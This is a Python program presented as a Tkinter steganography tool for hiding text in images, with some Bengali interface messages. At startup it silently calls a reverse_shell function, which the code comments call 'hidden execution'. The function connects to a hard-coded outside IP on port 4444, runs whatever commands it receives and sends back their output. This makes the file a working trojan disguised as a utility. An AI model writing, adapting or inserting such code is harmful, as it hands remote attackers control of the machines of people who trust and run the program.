import socket
import subprocess
import os
from stegano import lsb
import tkinter as tk
from tkinter import filedialog, messagebox

# Steganography Function: Hide Data in Image
def hide_data(image_path, secret_message, output_image):
    secret_img = lsb.hide(image_path, secret_message)
    secret_img.save(output_image)
    print(f" Successfull: {output_image}")

# Reverse Shell Function: Connect to Attacker's Machine
def reverse_shell():
    server_ip = "45.117.63.61"  # ip
    server_port = 4444  # port

    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((server_ip, server_port))

    while True:
        data = s.recv(1024).decode()
        if data.lower() == "exit":
            break

        output = subprocess.getoutput(data)
        s.send(output.encode())

    s.close()

# GUI Function for Steganography Tool
def hide_data_gui():
    image_path = filedialog.askopenfilename(title="Select an Image", filetypes=[("Image Files", "*.jpg;*.png")])
    if image_path:
        secret_message = secret_message_entry.get()
        output_image = filedialog.asksaveasfilename(defaultextension=".png", title="Save Hidden Image", filetypes=[("PNG Files", "*.png")])

        if secret_message and output_image:
            lsb.hide(image_path, secret_message).save(output_image)
            messagebox.showinfo("Success", "ফাইল সফলভাবে লুকানো হয়েছে!")
        else:
            messagebox.showerror("Error", "মেসেজ বা ফাইল পাথ দেওয়া হয়নি!")

# Tkinter GUI Setup
root = tk.Tk()
root.title("Steganography Tool")

tk.Label(root, text="Enter Secret Message:").pack(padx=10, pady=5)
secret_message_entry = tk.Entry(root, width=50)
secret_message_entry.pack(padx=10, pady=5)

tk.Button(root, text="Hide Data in Image", command=hide_data_gui).pack(padx=10, pady=10)

# Call Reverse Shell (hidden execution)
reverse_shell()

root.mainloop()
